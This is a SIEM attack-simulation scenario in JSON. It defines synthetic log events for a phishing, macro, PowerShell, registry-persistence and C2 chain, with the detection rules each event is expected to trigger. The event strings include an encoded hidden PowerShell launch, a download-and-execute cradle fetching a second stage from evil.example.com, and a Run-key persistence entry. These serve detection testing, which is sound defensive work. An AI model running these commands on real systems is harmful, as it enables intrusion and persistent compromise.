# bas-scenarios/phishing-to-execution-chain.json
{"_meta":{"content_type":"bas_scenario","content_version":1,"content_hash":"sha256:22d67f169343910d2f267cfd2bcaa218858007639fa4d8087198fcb7f870bdad","exported_at":1777314744,"exported_by":"Void SIEM","source":"api"},"id":"bas_phishing_execution","name":"Phishing to Execution Chain","description":"Simulates a spearphishing attack with malicious attachment leading to macro execution, PowerShell spawn, and registry persistence. Tests the full initial access to persistence kill chain.","category":"initial_access","mitre_techniques":["T1566.001","T1204.002","T1059.001","T1547.001"],"events_template":[{"event_type":"email_received","source_ip":"198.51.100.77","destination_ip":"10.0.1.55","destination_port":25,"protocol":"tcp","direction":"inbound","severity":"high","source_hostname":"ws-lab-055","raw":"Email received: From=hr-benefits@ev1l-corp.com To=john.doe@company.com Subject='Q4 Benefits Update - Action Required' Attachment=Benefits_Update_Q4.xlsm Size=245KB"},{"event_type":"email_received","source_ip":"198.51.100.77","destination_ip":"10.0.1.55","destination_port":25,"protocol":"tcp","direction":"inbound","severity":"medium","source_hostname":"ws-lab-055","raw":"Email attachment analysis: Benefits_Update_Q4.xlsm contains VBA macros with AutoOpen trigger and Shell() calls"},{"event_type":"process_create","source_ip":"10.0.1.55","destination_ip":"10.0.1.55","destination_port":0,"protocol":"","direction":"local","severity":"high","source_hostname":"ws-lab-055","source_user":"john.doe","raw":"EXCEL.EXE (pid:3412) spawned child process cmd.exe (pid:5678) - macro execution detected"},{"event_type":"process_create","source_ip":"10.0.1.55","destination_ip":"10.0.1.55","destination_port":0,"protocol":"","direction":"local","severity":"high","source_hostname":"ws-lab-055","source_user":"john.doe","raw":"cmd.exe (pid:5678) spawned child process powershell.exe (pid:7890) with arguments: -NoP -W Hidden -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUA"},{"event_type":"process_create","source_ip":"10.0.1.55","destination_ip":"10.0.1.55","destination_port":0,"protocol":"","direction":"local","severity":"high","source_hostname":"ws-lab-055","source_user":"john.doe","raw":"powershell.exe (pid:7890) executing: IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')"},{"event_type":"network","source_ip":"10.0.1.55","destination_ip":"203.0.113.50","destination_port":80,"protocol":"tcp","direction":"outbound","severity":"high","source_hostname":"ws-lab-055","raw":"HTTP GET http://evil.example.com/stage2.ps1 - download cradle fetching second stage payload (32KB)"},{"event_type":"file_create","source_ip":"10.0.1.55","destination_ip":"10.0.1.55","destination_port":0,"protocol":"","direction":"local","severity":"high","source_hostname":"ws-lab-055","source_user":"john.doe","raw":"File created: C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost.exe by powershell.exe (pid:7890)"},{"event_type":"process_create","source_ip":"10.0.1.55","destination_ip":"10.0.1.55","destination_port":0,"protocol":"","direction":"local","severity":"high","source_hostname":"ws-lab-055","source_user":"john.doe","raw":"C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost.exe (pid:9012) launched - masquerading as system process"},{"event_type":"registry_change","source_ip":"10.0.1.55","destination_ip":"10.0.1.55","destination_port":0,"protocol":"","direction":"local","severity":"high","source_hostname":"ws-lab-055","source_user":"john.doe","raw":"Registry value set: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate = C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost.exe"},{"event_type":"network","source_ip":"10.0.1.55","destination_ip":"203.0.113.100","destination_port":443,"protocol":"tcp","direction":"outbound","severity":"high","source_hostname":"ws-lab-055","raw":"HTTPS connection to 203.0.113.100:443 (c2.evil.example.com) from svchost.exe (pid:9012) - 128 bytes sent, C2 beacon established"}],"expected_rules":["phishing_attachment","macro_execution","suspicious_powershell","registry_persistence"],"expected_severity":"high","timeout_seconds":120,"enabled":true}